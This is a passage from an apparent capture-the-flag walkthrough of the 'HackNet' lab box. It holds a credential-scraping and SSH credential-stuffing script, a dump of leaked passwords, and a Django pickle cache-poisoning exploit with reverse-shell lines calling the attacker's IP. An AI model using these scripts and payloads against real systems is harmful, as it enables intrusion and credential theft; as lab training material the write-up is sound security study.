print(f" [!] Error decoding/parsing QuerySet: {e}")

return []

  

def main():

all_creds: Set[Tuple[str, str]] = set()

cookies = COOKIES_STR

  

print("[*] Starting extraction process...")

for post_id in POST_ID_RANGE:

print(f"[*] Fetching and parsing response for ID {post_id}...")

  

resp = fetch_post_response_with_curl(post_id, cookies=cookies)

if not resp:

print(" [!] Empty or failed response")

continue

  

encoded_queryset = extract_queryset_encoded(resp)

if not encoded_queryset:

print(" [!] QuerySet not found in response")

continue

  

users = parse_queryset(encoded_queryset)

if not users:

print(" [!] Failed to parse decoded QuerySet")

continue

  

for user in users:

if not isinstance(user, dict):

continue

uname = str(user.get("username", "")).strip()

pwd = str(user.get("password", "")).strip()

# skip obvious template placeholders

if uname and pwd and "{{" not in uname:

all_creds.add((uname, pwd))

  

print(f"[+] Extracted {len(all_creds)} unique credentials.")

  

# Write combined QuerySet-like dump

entries = []

for idx, (uname, pwd) in enumerate(sorted(all_creds), start=1):

# Search for the original user dict in parsed data to get the real email

real_email = None

for post_id in POST_ID_RANGE:

resp = fetch_post_response_with_curl(post_id, cookies=cookies)

encoded_queryset = extract_queryset_encoded(resp)

users = parse_queryset(encoded_queryset or "")

for user in users:

if isinstance(user, dict) and user.get("username", "").strip() == uname:

real_email = user.get("email", f"{uname}@example.com")

break

if real_email:

break

  

entry = {

"id": idx,

"email": real_email, # Fallback

"username": uname,

"password": pwd,

"is_public": True,

"is_hidden": False,

"two_fa": False

}

entries.append(entry)

  

if entries:

with open("combined_query_set_dump.txt", "w", encoding="utf-8") as f:

f.write("<QuerySet [\n")

for i, e in enumerate(entries):

comma = "," if i < len(entries) - 1 else ""

f.write(f" {e}{comma}\n")

f.write("]>\n")

print("[+] Combined QuerySet dump saved to 'combined_query_set_dump.txt'.")

else:

print("[!] No entries to write.")

  

if __name__ == "__main__":

main()
```

The script returned 25 unique credentials
 this is the dump:

```text
<QuerySet [
  {'id': 1, 'email': 'mikey@hacknet.htb', 'username': 'backdoor_bandit', 'password': 'mYd4rks1dEisH3re', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 2, 'email': 'blackhat_wolf@cypherx.com', 'username': 'blackhat_wolf', 'password': 'Bl@ckW0lfH@ck', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 3, 'email': 'brute_force@ciphermail.com', 'username': 'brute_force', 'password': 'BrUt3F0rc3#', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 4, 'email': 'bytebandit@exploitmail.net', 'username': 'bytebandit', 'password': 'Byt3B@nd!t123', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 5, 'email': 'codebreaker@ciphermail.com', 'username': 'codebreaker', 'password': 'C0d3Br3@k!', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 6, 'email': 'cryptoraven@securemail.org', 'username': 'cryptoraven', 'password': 'CrYptoR@ven42', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 7, 'email': 'cyberghost@darkmail.net', 'username': 'cyberghost', 'password': 'Gh0stH@cker2024', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 8, 'email': 'darkseeker@darkmail.net', 'username': 'darkseeker', 'password': 'D@rkSeek3r#', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 9, 'email': 'datadive@darkmail.net', 'username': 'datadive', 'password': 'D@taD1v3r', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 10, 'email': 'deepdive@hacknet.htb', 'username': 'deepdive', 'password': 'D33pD!v3r', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 11, 'email': 'exploit_wizard@hushmail.com', 'username': 'exploit_wizard', 'password': 'Expl01tW!zard', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 12, 'email': 'glitch@cypherx.com', 'username': 'glitch', 'password': 'Gl1tchH@ckz', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 13, 'email': 'hexhunter@ciphermail.com', 'username': 'hexhunter', 'password': 'H3xHunt3r!', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 14, 'email': 'netninja@hushmail.com', 'username': 'netninja', 'password': 'N3tN1nj@2024', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 15, 'email': 'packetpirate@exploitmail.net', 'username': 'packetpirate', 'password': 'P@ck3tP!rat3', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 16, 'email': 'phreaker@securemail.org', 'username': 'phreaker', 'password': 'Phre@k3rH@ck', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 17, 'email': 'rootbreaker@exploitmail.net', 'username': 'rootbreaker', 'password': 'R00tBr3@ker#', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 18, 'email': 'shadowcaster@darkmail.net', 'username': 'shadowcaster', 'password': 'Sh@d0wC@st!', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 19, 'email': 'shadowmancer@cypherx.com', 'username': 'shadowmancer', 'password': 'Sh@d0wM@ncer', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 20, 'email': 'shadowwalker@hushmail.com', 'username': 'shadowwalker', 'password': 'Sh@dowW@lk2024', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 21, 'email': 'stealth_hawk@exploitmail.net', 'username': 'stealth_hawk', 'password': 'St3@lthH@wk', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 22, 'email': 'trojanhorse@securemail.org', 'username': 'trojanhorse', 'password': 'Tr0j@nH0rse!', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 23, 'email': 'virus_viper@securemail.org', 'username': 'virus_viper', 'password': 'V!rusV!p3r2024', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 24, 'email': 'whitehat@darkmail.net', 'username': 'whitehat', 'password': 'Wh!t3H@t2024', 'is_public': True, 'is_hidden': False, 'two_fa': False},
  {'id': 25, 'email': 'zero_day@hushmail.com', 'username': 'zero_day', 'password': 'Zer0D@yH@ck', 'is_public': True, 'is_hidden': False, 'two_fa': False}
]>

```

combining with the first ssh credential stuffer script to a final script: (this is just the last part that is modified)

```python
if __name__ == "__main__":

main()
# === Step 1: Load combined QuerySet from file ===

with open("combined_query_set_dump.txt", "r", encoding="utf-8") as f:

raw_dump = f.read().strip()

  

print("[*] Parsing credentials...")

  

if raw_dump.startswith("<QuerySet [") and raw_dump.endswith("]>"):

data_str = raw_dump[len("<QuerySet ["):-2]

data_str = "[" + data_str + "]"

else:

print("[!] Invalid format in combined_query_set_dump.txt")

exit(1)

  

try:

data = ast.literal_eval(data_str)

except Exception as e:

print(f"[!] Failed to parse QuerySet: {e}")

exit(1)

  

# === Step 2: Extract username:password pairs ===

credentials = []

for user in data:

username = user.get("username", "").strip().replace("\n", "")

password = user.get("password", "").strip().replace("\n", "")

if not username or not password or "{{" in username:

continue

credentials.append((username, password))

  

print(f"[+] Extracted {len(credentials)} valid credentials.")

  

# === Step 3: SSH credential stuffing ===

host = "hacknet.htb"

  

print("[*] Starting SSH credential stuffing...\n")

  

for username, password in credentials:

print(f"[*] Trying {username}:{password} ...")

  

try:

result = subprocess.run(

[

"sshpass", "-p", password,

"ssh", "-o", "StrictHostKeyChecking=no",

"-o", "ConnectTimeout=5",

f"{username}@{host}", "echo login_success"

],

stdout=subprocess.PIPE,

stderr=subprocess.DEVNULL

)

  

output = result.stdout.decode().strip()

if "login_success" in output:

print(f"[+] SUCCESS! Valid credentials: {username}:{password}")

break

  

except FileNotFoundError:

print("[-] sshpass is not installed. Run: sudo apt install sshpass")

break

except Exception as e:

print(f"[!] Error: {e}")

  

time.sleep(0.5)

  

print("[*] Done.")
```

there is still an issue with the code I think because of using the username and password as username password from the dump but maybe it is email (parse before the @) password, so I will modify the script again to try email(before @):pass and username:pass for every user 

because all of the results were given permission denied from ssh so this is the final script (I will attach changed part from the code):

```python
if __name__ == "__main__":

if os.path.exists("combined_query_set_dump.txt"):

print("[*] 'combined_query_set_dump.txt' already exists. Skipping extraction step.")

else:

main()

  

# === Step 1: Load combined QuerySet from file ===

with open("combined_query_set_dump.txt", "r", encoding="utf-8") as f:

raw_dump = f.read().strip()

  

print("[*] Parsing credentials...")

  

if raw_dump.startswith("<QuerySet [") and raw_dump.endswith("]>"):

data_str = raw_dump[len("<QuerySet ["):-2]

data_str = "[" + data_str + "]"

else:

print("[!] Invalid format in combined_query_set_dump.txt")

exit(1)

  

try:

data = ast.literal_eval(data_str)

except Exception as e:

print(f"[!] Failed to parse QuerySet: {e}")

exit(1)

  

# === Step 2: Extract username:password pairs ===

credentials = []

for user in data:

username_from_email = user.get("email", "").split("@")[0].strip().replace("\n", "")

username = user.get("username", "").strip().replace("\n", "")

password = user.get("password", "").strip().replace("\n", "")

if not username or not password or "{{" in username:

continue

credentials.append((username, password))

  

print(f"[+] Extracted {len(credentials)} valid credentials.")

  

# === Step 3: SSH credential stuffing ===

host = "hacknet.htb"

  

print("[*] Starting SSH credential stuffing...\n")

print("---------------------------------------------------------------------------------\n")

  

for rec in data:

username = rec.get("username", "").strip().replace("\n", "")

password = rec.get("password", "").strip().replace("\n", "")

email = rec.get("email", "").strip().replace("\n", "")

if not username or not password or "{{" in username:

continue

  

candidates = [username]

if email and "@" in email:

local_part = email.split("@", 1)[0]

if local_part and local_part not in candidates:

candidates.append(local_part)

  

for cand in candidates:

print(f"[*] Trying {cand}@{host}:{password} ...")

try:

result = subprocess.run(

[

"sshpass", "-p", password,

"ssh", "-o", "StrictHostKeyChecking=no",

"-o", "ConnectTimeout=5",

f"{cand}@{host}", "echo login_success"

],

stdout=subprocess.PIPE,

stderr=subprocess.DEVNULL

)

output = result.stdout.decode().strip()

except FileNotFoundError:

print("[-] sshpass is not installed. Run: sudo apt install sshpass")

sys.exit(1)

except Exception as e:

print(f"[!] Error: {e}")

output = ""

  

if "login_success" in output:

print(f"[+] SUCCESS! Valid credentials: {cand}@{host}:{password}")

sys.exit(0)

  

time.sleep(0.5)

  

print("[*] Done.")
```

Note: Don't forget to add imports of `sys`, `os`

```shell
python hacknet.py 
[*] 'combined_query_set_dump.txt' already exists. Skipping extraction step.
[*] Parsing credentials...
[+] Extracted 25 valid credentials.
[*] Starting SSH credential stuffing...

---------------------------------------------------------------------------------

[*] Trying backdoor_bandit@hacknet.htb:mYd4rks1dEisH3re ...
[*] Trying mikey@hacknet.htb:mYd4rks1dEisH3re ...
[+] SUCCESS! Valid credentials: mikey@hacknet.htb:mYd4rks1dEisH3re

```

```shell
mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt 
e1dcc2423231cf1ec59f7e974a0292bb
```


## Gaining Root Flag

mikey:mYd4rks1dEisH3re

```shell
mikey@hacknet:~$ ls -la
total 44
drwx------ 6 mikey mikey 4096 Sep  4 15:01 .
drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..
lrwxrwxrwx 1 root  root     9 Sep  4 15:01 .bash_history -> /dev/null
-rw-r--r-- 1 mikey mikey  220 May 31  2024 .bash_logout
-rw-r--r-- 1 mikey mikey 3526 May 31  2024 .bashrc
drwxr-xr-x 3 mikey mikey 4096 May 31  2024 .cache
drwx------ 3 mikey mikey 4096 Jun  2  2024 .config
-rw------- 1 mikey mikey   20 Jul  3  2024 .lesshst
drwxr-xr-x 4 mikey mikey 4096 Jul  8  2024 .local
lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 mikey mikey  807 May 31  2024 .profile
lrwxrwxrwx 1 root  root     9 May 31  2024 .python_history -> /dev/null
drwx------ 2 mikey mikey 4096 Dec 28  2024 .ssh
-rw-r--r-- 1 mikey mikey    0 Jun 19  2024 .sudo_as_admin_successful
-rw-r----- 1 root  mikey   33 Sep 25 01:58 user.txt
mikey@hacknet:~$ cat .sudo_as_admin_successful 
mikey@hacknet:~$ 

```

This is weird

I will run linpeas.sh and cherry pick the results of importance:

```shell
Services with writable paths? . gunicorn.service: Uses relative path '\' (from ExecStart=/home/sandy/.local/bin/gunicorn \)
mariadb.service: Uses relative path 'ExecStartPre=/usr/bin/mysql_install_db' (from # ExecStartPre=/usr/bin/mysql_install_db -u mysql)
mariadb.service: Uses relative path '$MYSQLD_OPTS' (from ExecStart=/usr/sbin/mariadbd $MYSQLD_OPTS $_WSREP_NEW_CLUSTER $_WSREP_START_POSITION)
mariadb.service: Uses relative path 'ExecStartPre=sync' (from # ExecStartPre=sync)
mariadb.service: Uses relative path 'ExecStartPre=sysctl' (from # ExecStartPre=sysctl -q -w vm.drop_caches=3)
mariadb.service: Uses relative path 'Change' (from # Change ExecStart=numactl --interleave=all /usr/sbin/mariadbd......)

Contents of /etc/hosts:                                                                                                                                                                                                                     
  127.0.0.1     localhost hacknet.htb
  127.0.1.1     hacknet.hacknet.htb     hacknet
  ::1     localhost ip6-localhost ip6-loopback
  ff02::1 ip6-allnodes
  ff02::2 ip6-allrouters

Active Ports (netstat)                                                                                                                                                                                                                  
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -      

mikey:x:1000:1000:mikey,,,:/home/mikey:/bin/bash
root:x:0:0:root:/root:/bin/bash
sandy:x:1001:1001::/home/sandy:/bin/bash

-rw-r--r-- 1 root root 1126 Nov 29  2023 /etc/mysql/mariadb.cnf                                                                                   
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

/usr/bin/ping cap_net_raw=ep
/usr/bin/tcpdump cap_net_raw=eip

Backup folders
drwxr-xr-x 3 root root 4096 Sep 25 02:45 /var/backups                                                                                                                                                                                       
total 44
-rw-r--r-- 1 root root 16072 Sep  5 07:35 apt.extended_states.0
-rw-r--r-- 1 root root  1763 Mar 20  2025 apt.extended_states.1.gz
-rw-r--r-- 1 root root  1659 Feb  9  2025 apt.extended_states.2.gz
-rw-r--r-- 1 root root  1792 Feb  9  2025 apt.extended_states.3.gz
-rw-r--r-- 1 root root  1787 Feb  5  2025 apt.extended_states.4.gz
-rw-r--r-- 1 root root  1781 Aug  8  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root  1646 Aug  8  2024 apt.extended_states.6.gz
drwxr-xr-x 2 root root  4096 Sep  4 15:01 hygiene

drwxr-xr-x 2 sandy sandy 4096 Dec 29  2024 /var/www/HackNet/backups
total 48
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg


Found /var/www/HackNet/db.sqlite3


```

### Exploiting Sandy's Permissions

There seems to be a user sandy with archives belonging to her, but before I do I will check `/var/www/Hacknet` first because several important files were found there

```shell
ls -la
total 32
drwxr-xr-x 7 sandy sandy    4096 Feb 10  2025 .
drwxr-xr-x 4 root  root     4096 Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4096 Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4096 Sep  8 05:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4096 Aug  8  2024 media
drwxr-xr-x 6 sandy sandy    4096 Sep  8 05:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4096 May 31  2024 static

```


nothing in the db.sqlite3:

```shell
sqlite3 db.sqlite3                                                             
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
sqlite> .tables;
Error: unknown command or invalid arguments:  "tables;". Enter ".help" for help
sqlite> .databases
main: /home/husmal/hacknet/hacknet.htb:8999/db.sqlite3 r/w
sqlite> .schema
sqlite> 

```

it was already empty (because of size) I didn't notice

Will see manage.py:

```shell
cat manage.py 
#!/usr/bin/env python3
"""Django's command-line utility for administrative tasks."""
import os
import sys


def main():
    """Run administrative tasks."""
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'HackNet.settings')
    try:
        from django.core.management import execute_from_command_line
    except ImportError as exc:
        raise ImportError(
            "Couldn't import Django. Are you sure it's installed and "
            "available on your PYTHONPATH environment variable? Did you "
            "forget to activate a virtual environment?"
        ) from exc
    execute_from_command_line(sys.argv)


if __name__ == '__main__':
    main()

```

Looks like manage.py is the utility to run Django management commands

let's see what we can do with the backups that belong to sandy (they are encrypted with gpg keys):

```shell
ls -la
total 56
drwxr-xr-x 2 sandy sandy  4096 Dec 29  2024 .
drwxr-xr-x 7 sandy sandy  4096 Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy 13445 Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy 13713 Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy 13851 Dec 29  2024 backup03.sql.gpg
mikey@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup01.sql.gpg
gpg: encrypted with RSA key, ID FC53AFB0D6355F16
gpg: decryption failed: No secret key
gpg --list-secret-keys
mikey@hacknet:/var/www/HackNet/backups$ 

```

there should be a secret key somewhere, the manage script points to a settings.py file somewhere in Hacknet directory so I will go there and inspect

```shell
cd ../HackNet/
mikey@hacknet:/var/www/HackNet/HackNet$ ls -lahv
total 28K
drwxr-xr-x 3 sandy sandy 4.0K Sep  8 05:20 .
drwxr-xr-x 7 sandy sandy 4.0K Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy  168 May 31  2024 asgi.py
-rw-r--r-- 1 sandy sandy 2.7K Feb 10  2025 settings.py
-rw-r--r-- 1 sandy sandy  313 Sep  8 05:20 urls.py
-rw-r--r-- 1 sandy sandy  168 May 31  2024 wsgi.py
-rw-r--r-- 1 sandy sandy    0 May 31  2024 __init__.py
drwxr-xr-x 2 sandy sandy 4.0K Sep  8 05:22 __pycache__

```

```shell
cat settings.py 
from pathlib import Path
import os

BASE_DIR = Path(__file__).resolve().parent.parent

SECRET_KEY = 'agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w'

DEBUG = False

ALLOWED_HOSTS = ['hacknet.htb']

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'SocialNetwork'
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'HackNet.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'HackNet.wsgi.application'

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'hacknet',
        'USER': 'sandy',
        'PASSWORD': 'h@ckn3tDBpa$$',
        'HOST':'localhost',
        'PORT':'3306',
    }
}

CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]

SESSION_ENGINE = 'django.contrib.sessions.backends.db'

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_L10N = True

USE_TZ = True

STATICFILES_STORAGE = 'django.contrib.staticfiles.storage.StaticFilesStorage'
STATIC_ROOT = os.path.join(BASE_DIR, 'static')
STATIC_URL = '/static/'

MEDIA_ROOT = os.path.join(BASE_DIR, 'media')
MEDIA_URL = '/media/'

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'
```


so there are some secrets from this file:
- secret key: `agyasdf&^F&ADf87AF*Df9A5D^AS%D6DflglLADIuhldfa7w`
- Sandy credentials to the database on port 3306: `sandy:h@ckn3tDBpa$$`

The `SECRET_KEY` in Django is used for cryptographic signing:

- Sign session cookies    
- Sign password reset tokens
- Generate CSRF tokens
- Sign JSON Web Tokens 
- Salt password hashes (as part of the hashing process)

so this may help us uncovering credentials from the database running locally, now we have to connect to mysql locally and check the database

```shell
mysql -u sandy -p -h 127.0.0.1 -P 3306
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1356
Server version: 10.11.11-MariaDB-0+deb12u1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| hacknet            |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.009 sec)

MariaDB [(none)]> use hacknet;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hacknet]> show tables;
+-----------------------------------+
| Tables_in_hacknet                 |
+-----------------------------------+
| SocialNetwork_contactrequest      |
| SocialNetwork_socialarticle       |
| SocialNetwork_socialarticle_likes |
| SocialNetwork_socialcomment       |
| SocialNetwork_socialmessage       |
| SocialNetwork_socialuser          |
| SocialNetwork_socialuser_contacts |
| auth_group                        |
| auth_group_permissions            |
| auth_permission                   |
| auth_user                         |
| auth_user_groups                  |
| auth_user_user_permissions        |
| django_admin_log                  |
| django_content_type               |
| django_migrations                 |
| django_session                    |
+-----------------------------------+
17 rows in set (0.001 sec)

MariaDB [hacknet]> SELECT * FROM auth_user;
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login                 | is_superuser | username | first_name | last_name | email | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$720000$I0qcPWSgRbUeGFElugzW45$r9ymp7zwsKCKxckgnl800wTQykGK3SgdRkOxEmLiTQQ= | 2025-02-05 17:01:02.503833 |            1 | admin    |            |           |       |        1 |         1 | 2024-08-08 18:17:54.472758 |
+----+------------------------------------------------------------------------------------------+----------------------------+--------------+----------+------------+-----------+-------+----------+-----------+----------------------------+
1 row in set (0.000 sec)

MariaDB [hacknet]> 

```

this hash is of type: Django (PBKDF2-SHA256)

The django secret key does not help us in cracking the hash, because it is not used to salt password hashes

and this hash type is very difficult to crack locally, the format is :

`pbkdf2_sha256$iterations$salt$hash` -> `pbkdf2_sha256$720000$salt$hash` impossible to crack locally without GPU

Hint from discord is to look at the `/var/tmp/django_cache` directory:

```shell
ls -lad /var/tmp/django_cache
drwxrwxrwx 2 sandy www-data 4096 Feb 10  2025 /var/tmp/django_cache
```

so it is owned by sandy and group www-data, I will research a bit how can I take advantage of this

Apparently, this django environment has file-based caching, from settings.py block:

```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

Django's file-based cache backend uses Python's `pickle` module for serialization, which can lead to RCE and privilege escalation if an attacker gains access to the cache files.

SO we have to craft a malicious pickle payload that executes commands upon deserialization. I will use this guide: https://davidhamann.de/2020/04/05/exploiting-python-pickle/

On our machine run this payload:

```python
import pickle
import os
import subprocess

class Exploit:
    def __reduce__(self):
        # Replace with your IP and port
        cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"
        return (os.system, (cmd,))

# Create the malicious pickle
malicious_object = Exploit()
pickle_data = pickle.dumps(malicious_object)

# Save to a file for later use
with open('malicious_pickle.txt', 'wb') as f:
    f.write(pickle_data)
```

then transfer the file to the hacknet server:

```shell
 scp malicious_pickle.txt mikey@hacknet.htb:/dev/shm
mikey@hacknet.htb's password: 
malicious_pickle.txt
```


now we have to generate a django cache so we can poison, simply login the application and go to an endpoint, I chose `/explore`

```shell
ls -lah /var/tmp/django_cache/
total 20K
drwxrwxrwx 2 sandy www-data 4.0K Sep 26 04:05 .
drwxrwxrwt 4 root  root     4.0K Sep 26 02:21 ..
-rw------- 1 sandy www-data   34 Sep 26 04:05 1f0acfe7480a469402f1852f8313db86.djcache
-rw------- 1 sandy www-data 2.8K Sep 26 04:05 90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

now we have to override the cache and we already have the necessary pickle data will try this script from GPT:

```python
# Python script to create properly formatted cache entry
import pickle
import struct
import time
import os

class RCE:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"
        return (os.system, (cmd,))

# Create the malicious pickle
malicious_object = RCE()
pickled_data = pickle.dumps(malicious_object)

# Create Django cache format: expiration + length + data
expires = int(time.time()) + 3600  # 1 hour from now
cache_entry = struct.pack('<II', expires, len(pickled_data)) + pickled_data

# Write to file that matches existing cache filename
with open('/dev/shm/malicious_cache.djcache', 'wb') as f:
    f.write(cache_entry)

print("Created properly formatted cache entry")

```

Now override the original cache:

```shell
cp /dev/shm/malicious_cache.djcache /var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache
```


but we get permission denied, so let's try deleting and then maybe write to the same file name

```shell
rm 1f0acfe7480a469402f1852f8313db86.djcache 
rm: remove write-protected regular file '1f0acfe7480a469402f1852f8313db86.djcache'? y

```


so I created a bash script to automate creating the payload and copying to cache names (they are the same name always):

```bash
#!/bin/bash

# Replace these values:
LHOST="10.10.16.60"
LPORT="12345"

## Generate a new malicious pickle payload
cat << 'EOF' > /tmp/gen_poc.py
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return os.system, (
            'bash -c "bash -i >& /dev/tcp/10.10.16.60/12345 0>&1"',
        )

payload = pickle.dumps(Exploit())
import sys
sys.stdout.buffer.write(payload)
EOF

sed -i "s/%LHOST%/$LHOST/g" /tmp/gen_poc.py
sed -i "s/%LPORT%/$LPORT/g" /tmp/gen_poc.py

# Generate the binary pickle object
python3 /tmp/gen_poc.py > /tmp/exploit.pkl

cd /var/tmp/django_cache

# Remove old cache files (to bypass permissions issue)
rm -f 1f0acfe7480a469402f1852f8313db86.djcache 2>/dev/null
rm -f 90dbab8f3b1e54369abdeb4ba1efc106.djcache 2>/dev/null

# Recreate both cache files with exploit payload
cp /tmp/exploit.pkl 1f0acfe7480a469402f1852f8313db86.djcache
cp /tmp/exploit.pkl 90dbab8f3b1e54369abdeb4ba1efc106.djcache

echo "[+] Cache files poisoned."
echo "[+] Start netcat listener: nc -nlvp $LPORT"
echo "[+] Then visit the '/explore' page as user mikey"

```

After opening listener on port 12345, we have a reverse shell!

```shell
sandy@hacknet:/var/www/HackNet$ whoami
sandy

```

Note: to stablize shell:

```shell
1- python3 -c 'import pty; pty.spawn("/bin/bash")'
2- CNTRL + Z
3- stty raw -echo; fg
4- echo TERM=xterm (or check through 'echo $TERM' in your attack host)
```

in sandy's home directory we find:

```shell
ls -la
total 36
drwx------ 6 sandy sandy 4096 Sep 11 11:18 .
drwxr-xr-x 4 root  root  4096 Jul  3  2024 ..
lrwxrwxrwx 1 root  root     9 Sep  4 19:01 .bash_history -> /dev/null
-rw-r--r-- 1 sandy sandy  220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 sandy sandy 3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 sandy sandy 4096 Jul  3  2024 .cache
drwx------ 3 sandy sandy 4096 Dec 21  2024 .config
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .gnupg
drwxr-xr-x 5 sandy sandy 4096 Jul  3  2024 .local
lrwxrwxrwx 1 root  root     9 Aug  8  2024 .mysql_history -> /dev/null
-rw-r--r-- 1 sandy sandy  808 Jul 11  2024 .profile
lrwxrwxrwx 1 root  root     9 Jul  3  2024 .python_history -> /dev/null

```

maybe the keys for the backups are there

```shell
sandy@hacknet:~$ cd .gnupg/
sandy@hacknet:~/.gnupg$ ls -la
total 32
drwx------ 4 sandy sandy 4096 Sep  5 11:33 .
drwx------ 6 sandy sandy 4096 Sep 11 11:18 ..
drwx------ 2 sandy sandy 4096 Sep  5 11:33 openpgp-revocs.d
drwx------ 2 sandy sandy 4096 Sep  5 11:33 private-keys-v1.d
-rw-r--r-- 1 sandy sandy  948 Sep  5 11:33 pubring.kbx
-rw------- 1 sandy sandy   32 Sep  5 11:33 pubring.kbx~
-rw------- 1 sandy sandy  600 Sep  5 11:33 random_seed
-rw------- 1 sandy sandy 1280 Sep  5 11:33 trustdb.gpg
sandy@hacknet:~/.gnupg$ gpg --list-secret-keys
/home/sandy/.gnupg/pubring.kbx
------------------------------
sec   rsa1024 2024-12-29 [SC]
